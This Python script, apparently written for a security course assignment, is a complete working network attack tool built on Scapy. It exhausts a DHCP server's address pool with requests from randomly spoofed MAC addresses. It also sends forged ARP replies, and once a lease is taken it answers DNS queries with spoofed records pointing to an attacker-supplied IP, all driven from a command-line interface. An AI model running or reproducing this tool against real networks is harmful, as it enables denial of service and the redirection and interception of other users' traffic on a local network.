# *****************
# Walt
# floodFury.py
# 18 Jun 24
# CSC842 Cycle 6
# ****************

from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.dns import DNS, DNSQR, DNSRR
import logging
import random
import argparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

#  Sending DHCP discover from the spoofed MAC address (broadcast).
#  :param spoofed_mac: Fake MAC address
#  :param i_face: The system's network interface for the attack
   
def dhcp_discover(spoofed_mac, i_face):

    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=spoofed_mac, dst=mac_dest)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=spoofed_mac,
                 xid=random.randint(1, 1000000000),
                 flags=0xFFFFFF)
    dsc /= DHCP(options=[("message-type", "discover"),
                         "end"])
    sendp(dsc, iface=i_face, verbose=False)
    logging.info("DHCP discover sent from %s", spoofed_mac)



# Sending DHCP request for a specific IP from the spoofed MAC address (broadcast).
#  req_ip: IP requested by the attacker for the fake MAC address
#  spoofed_mac: Fake MAC address
#  server_ip: DHCP server's IP
#  i_face: The system's network interface for the attack

def dhcp_request(req_ip, spoofed_mac, server_ip, i_face):

    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    req = Ether(src=spoofed_mac, dst=mac_dest)
    req /= IP(src="0.0.0.0", dst=ip_dest)
    req /= UDP(sport=68, dport=67)
    req /= BOOTP(chaddr=spoofed_mac,
                 xid=random.randint(1, 1000000000))
    req /= DHCP(options=[("message-type", "request"),
                         ("server_id", server_ip),
                         ("requested_addr", req_ip),
                         "end"])
    sendp(req, iface=i_face, verbose=False)
    logging.info('DHCP request sent for IP %s from %s', req_ip, spoofed_mac)


def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
    reply = ARP(op=2, hwsrc=source_mac, psrc=src_ip, hwdst=server_mac, pdst=server_ip)
    send(reply, iface=i_face, verbose=False)
    logging.info('ARP reply sent from %s to %s', source_mac, server_mac)


def dns_spoof(pkt, spoof_ip):
    if DNS in pkt and pkt[DNS].qd:
        # Construct the DNS response
        dns_resp = (
            Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
            DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip)
            )
        )
        sendp(dns_resp, iface=pkt.sniffed_on, verbose=False)
        logging.info('Spoofed DNS response sent to %s for %s -> %s',
                     pkt[IP].src, pkt[DNS].qd.qname.decode(), spoof_ip)



# Performing the actual DHCP starvation by generating a DHCP handshake with a fake MAC address.
#  target_ip: The IP of the targeted DHCP server; if none given, use None.
#  i_face: The system's network interface for the attack
#  persistent: A flag indicating if the attack is persistent or temporary
#  spoof_ip: The IP address to respond with in DNS spoofing
 
def starve(target_ip=None, i_face=conf.iface, persistent=False, spoof_ip=None):

    cur_ip = None
    server_mac = None

    if target_ip:
        try:
            server_mac = sr1(ARP(op=1, pdst=target_ip), timeout=3, verbose=False)[ARP].hwsrc
        except Exception as e:
            logging.error("Failed to get target MAC address: %s", e)
            return

    while True:
        counter = 0
        mac = RandMAC()
        # Send a DHCP discover
        dhcp_discover(spoofed_mac=mac, i_face=i_face)
        while True:
            p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3, iface=i_face)
            if not p:
                if persistent:
                    logging.info("Resending DHCP discover, no leases found")
                    dhcp_discover(spoofed_mac=mac, i_face=i_face)
                else:
                    if counter >= 3:
                        logging.info("Finishing attack, no response after 3 tries")
                        return
                    counter += 1
                    logging.info("Retrying DHCP discover")
                    dhcp_discover(spoofed_mac=mac, i_face=i_face)
                continue

            if DHCP in p[0] and p[0][DHCP].options[0][1] == 2:
                ip = p[0][BOOTP].yiaddr
                src = p[0][IP].src
                if not target_ip and src != cur_ip:
                    cur_ip = src
                    try:
                        server_mac = sr1(ARP(op=1, pdst=src), timeout=3, verbose=False)[ARP].hwsrc
                    except Exception as e:
                        logging.error("Failed to get server MAC address: %s", e)
                        continue

                if src == target_ip or not target_ip:
                    break

        # Send DHCP request to the server with the given IP from the DHCP offer
        dhcp_request(req_ip=ip, spoofed_mac=mac, server_ip=target_ip if target_ip else cur_ip, i_face=i_face)
        arp_reply(src_ip=ip, source_mac=mac, server_ip=target_ip if target_ip else cur_ip, server_mac=server_mac, i_face=i_face)

        if spoof_ip:
            sniff(filter="udp port 53", prn=lambda x: dns_spoof(x, spoof_ip), iface=i_face, store=0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DHCP Starvation and DNS Spoofing')
    parser.add_argument('-p', '--persistent', default=False, action='store_true',
                        help='to make the attack persistent')
    parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                        help='Name of your wired/wireless interface')
    parser.add_argument('-t', '--target', metavar="TARGET", default=None, type=str,
                        help='IP of target server')
    parser.add_argument('-s', '--spoof-ip', metavar="SPOOFIP", type=str, required=False,
                        help='IP address to use for DNS spoofing')

    args = parser.parse_args()

    starve(target_ip=args.target, i_face=args.iface, persistent=args.persistent, spoof_ip=args.spoof_ip)
